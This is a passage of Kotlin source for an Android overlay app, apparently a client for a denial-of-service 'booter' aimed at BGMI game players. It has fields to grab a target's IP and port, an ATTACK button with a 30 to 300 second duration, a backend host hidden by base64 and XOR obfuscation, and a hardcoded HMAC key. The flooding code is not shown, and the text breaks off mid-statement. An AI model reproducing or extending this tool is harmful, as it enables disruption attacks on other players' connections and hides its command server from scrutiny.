package com.teamjadugar.apk

import android.animation.ObjectAnimator
import android.app.Service
import android.content.Intent
import android.graphics.PixelFormat
import android.media.MediaPlayer
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.view.Gravity
import android.view.LayoutInflater
import android.view.MotionEvent
import android.view.View
import android.view.WindowManager
import android.widget.*
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors
import javax.crypto.Mac
import javax.crypto.spec.SecretKeySpec

class FloatingService : Service() {

    private lateinit var windowManager: WindowManager
    private lateinit var floatingView: View
    private lateinit var bubbleView: View
    private lateinit var overlayView: View

    private lateinit var etIp: EditText
    private lateinit var etPort: EditText
    private lateinit var tvTime: TextView
    private lateinit var btnAttack: Button
    private lateinit var btnGetIp: Button
    private lateinit var tvLog: TextView
    private lateinit var tvSlots: TextView
    private lateinit var tvBubbleTimer: TextView

    private var selectedTime = 120
    private var isAttacking = false
    private var pulseAnimator: ObjectAnimator? = null
    private var slotsThread: Thread? = null
    private var overlayShown = false

    companion object {
        var instance: FloatingService? = null
        var etIpRef: EditText? = null
        var etPortRef: EditText? = null
        var btnGetIpRef: Button? = null

        const val MAX_ATTACK_SECONDS = 300
        const val MIN_ATTACK_SECONDS = 30
        
        private fun getDecryptedHost(): String {
            return "OTdMSUxESENMRUxNRUxN".let { enc ->
                val raw = android.util.Base64.decode(enc, android.util.Base64.NO_WRAP)
                raw.map { ((it.toInt() xor 0x5A) and 0xFF).toChar() }.joinToString("")
            }
        }

        private fun generateHMAC(jsonString: String): String {
            val key = "SPECTRE_SECURE_2026"
            val mac = Mac.getInstance("HmacSHA256")
            mac.init(SecretKeySpec(key.toByteArray(), "HmacSHA256"))
            return mac.doFinal(jsonString.toByteArray()).joinToString("") { String.format("%02x", it) }
        }
        
        val attackExecutor = Executors.newSingleThreadExecutor()

        fun onIpFound(ip: String, port: String) {
            Handler(Looper.getMainLooper()).post {
                etIpRef?.setText(ip); etPortRef?.setText(port)
                btnGetIpRef?.text = "IP FOUND ✅"
                btnGetIpRef?.setBackgroundColor(android.graphics.Color.parseColor("#22C55E"))
                btnGetIpRef?.setTextColor(android.graphics.Color.BLACK)
                Toast.makeText(instance, "BGMI IP Caught: $ip", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun playSound(type: String) {
        try {
            val resId = when(type) {
                "click" -> R.raw.click
                "success" -> R.raw.success
                "error" -> R.raw.error
                else -> return
            }
            val mp = MediaPlayer.create(this, resId)
            mp.start()
            mp.setOnCompletionListener { it.release() }
        } catch (e: Exception) {}
    }

    private val paramsPanel = WindowManager.LayoutParams(
        WindowManager.LayoutParams.WRAP_CONTENT, WindowManager.LayoutParams.WRAP_CONTENT,
        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL, PixelFormat.TRANSLUCENT)

    private val paramsBubble = WindowManager.LayoutParams(
        WindowManager.LayoutParams.WRAP_CONTENT, WindowManager.LayoutParams.WRAP_CONTENT,
        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE, PixelFormat.TRANSLUCENT)

    private val paramsOverlay = WindowManager.LayoutParams(
        WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.MATCH_PARENT,
        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE, PixelFormat.TRANSLUCENT)

    override fun onCreate() {
        super.onCreate()
        instance = this
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

        paramsPanel.gravity = Gravity.TOP or Gravity.START
        paramsPanel.x = 50; paramsPanel.y = 150
        floatingView = LayoutInflater.from(this).inflate(R.layout.floating_panel, null)

        paramsBubble.gravity = Gravity.TOP or Gravity.START
        paramsBubble.x = 50; paramsBubble.y = 150
        bubbleView = LayoutInflater.from(this).inflate(R.layout.floating_bubble, null)

        overlayView = LayoutInflater.from(this).inflate(R.layout.layout_big_timer, null)
        paramsOverlay.gravity = Gravity.CENTER

        windowManager.addView(floatingView, paramsPanel)

        etIp = floatingView.findViewById(R.id.fEtIp)
        etPort = floatingView.findViewById(R.id.fEtPort)
        tvTime = floatingView.findViewById(R.id.fTvTime)
        tvLog = floatingView.findViewById(R.id.tvLog)
        tvSlots = floatingView.findViewById(R.id.tvSlots)
        btnAttack = floatingView.findViewById(R.id.fBtnAttack)
        btnGetIp = floatingView.findViewById(R.id.fBtnGetIp)
        tvBubbleTimer = bubbleView.findViewById(R.id.tvBubbleTimer)

        val btnVpnOff = floatingView.findViewById<Button>(R.id.fBtnVpnOff)
        val seekBar = floatingView.findViewById<SeekBar>(R.id.fSeekBar)

        etIpRef = etIp; etPortRef = etPort; btnGetIpRef = btnGetIp

        startButtonPulse()
        updateSlotsFromPanel()

        floatingView.findViewById<TextView>(R.id.btnClose).setOnClickListener { 
            playSound("click")
            stopSelf() 
        }
        floatingView.findViewById<TextView>(R.id.btnMinimize).setOnClickListener {
            playSound("click")
            windowManager.removeView(floatingView)
            windowManager.addView(bubbleView, paramsBubble)
        }
        setupBubbleDrag()
        bubbleView.setOnClickListener {
            play
